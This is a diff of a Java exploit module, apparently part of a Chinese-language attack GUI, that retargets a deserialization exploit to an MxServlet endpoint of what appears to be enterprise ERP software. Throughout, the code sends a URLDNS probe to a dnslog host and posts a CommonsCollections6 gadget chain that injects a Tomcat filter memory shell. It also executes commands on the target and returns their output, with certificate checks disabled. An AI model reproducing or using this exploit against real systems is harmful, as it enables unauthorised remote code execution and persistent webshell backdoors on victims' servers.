@@ -17,7 +17,7 @@ import java.io.ObjectOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class XbrlPersistenceServlet extends VulnBase {
+public class MxServlet_Unserialize extends VulnBase {
     public static boolean DNSLOG = true;
     public static boolean JNDI = false;
     public static boolean EXEC = true;
@@ -26,16 +26,16 @@ public class XbrlPersistenceServlet extends VulnBase {
 
     private String flag = "yyds";
 
-    public XbrlPersistenceServlet() {
+    public MxServlet_Unserialize() {
     }
 
-    public XbrlPersistenceServlet(TextArea log, TextArea uploadLog, TextArea execLog) {
+    public MxServlet_Unserialize(TextArea log, TextArea uploadLog, TextArea execLog) {
         super(log, uploadLog, execLog);
     }
 
     @Override
     public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
-        String vulnerable_url = Config.TARGET + "/servlet/~uapxbrl/uap.xbrl.persistenceImpl.XbrlPersistenceServlet";
+        String vulnerable_url = Config.TARGET + "/servlet/~ic/nc.bs.framework.mx.MxServlet";
 
         try {
             if (Config.MOD.equals("poc")) {
@@ -69,7 +69,7 @@ public class XbrlPersistenceServlet extends VulnBase {
             SSLUtil.trustAllCertificates();
 
             // 发送请求
-            byte[] postData = Util.getSerializedData(URLDNS.getObject("XbrlPersistenceServlet." + Config.DNSLOG));
+            byte[] postData = Util.getSerializedData(URLDNS.getObject("MxServlet." + Config.DNSLOG));
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
@@ -83,12 +83,12 @@ public class XbrlPersistenceServlet extends VulnBase {
 
             int responseCode = HttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
-                logMessage("[+] XbrlPersistenceServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
+                logMessage("[+] MxServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
             } else {
-                logMessage("[-] XbrlPersistenceServlet 反序列化探测失败, 状态码: " + responseCode);
+                logMessage("[-] MxServlet 反序列化探测失败, 状态码: " + responseCode);
             }
         } catch (Exception e) {
-            logMessage("[-] XbrlPersistenceServlet 反序列化探测失败, 请尝试手动探测. " + e);
+            logMessage("[-] MxServlet 反序列化探测失败, 请尝试手动探测. " + e);
         }
     }
 
@@ -104,27 +104,27 @@ public class XbrlPersistenceServlet extends VulnBase {
 
             byte[] postData = Util.getSerializedData(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.TomcatFilterMemshellFromThread, ClassCode.Tomcat7_FilterMemshellFromThread_JDK7}));
 
-            HttpURLConnection conn = (HttpURLConnection) apiUrl.openConnection();
+            HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
-            HttpUtil.setTimeout(conn);
+            HttpUtil.setTimeout(urldns_conn);
 
             // 设置请求头
-            conn.setRequestProperty("Content-Type", "application/octet-stream");
-            conn.setRequestProperty("Content-Length", String.valueOf(postData.length));
+            urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
+            urldns_conn.setRequestProperty("Content-Length", String.valueOf(postData.length));
 
-            HttpUtil.post(conn, postData);
+            HttpUtil.post(urldns_conn, postData);
 
-            int responseCode = HttpUtil.getResponseCode(conn);
+            int responseCode = HttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 logMessage("[+] Filter 内存马注入成功! 请手动连接验证.");
                 return;
             } else {
-                logMessage("[-] XbrlPersistenceServlet 反序列化利用失败, 状态码: " + responseCode);
+                logMessage("[-] MxServlet 反序列化利用失败, 状态码: " + responseCode);
                 return;
             }
         } catch (Exception e) {
-            logMessage("[-] XbrlPersistenceServlet 反序列化利用失败, 请尝试手动利用. " + e);
+            logMessage("[-] MxServlet 反序列化利用失败, 请尝试手动利用. " + e);
             return;
         }
     }
@@ -158,7 +158,7 @@ public class XbrlPersistenceServlet extends VulnBase {
             int responseCode = HttpUtil.getResponseCode(exec_conn);
             String responseText = HttpUtil.getResponseText(exec_conn);
             if (responseCode == HttpURLConnection.HTTP_OK && responseText != null && !responseText.isEmpty()) {
-                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 1));
+                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 7));
                 return;
             } else {
                 logExec("[-] 命令执行失败. 请尝试手动利用.");
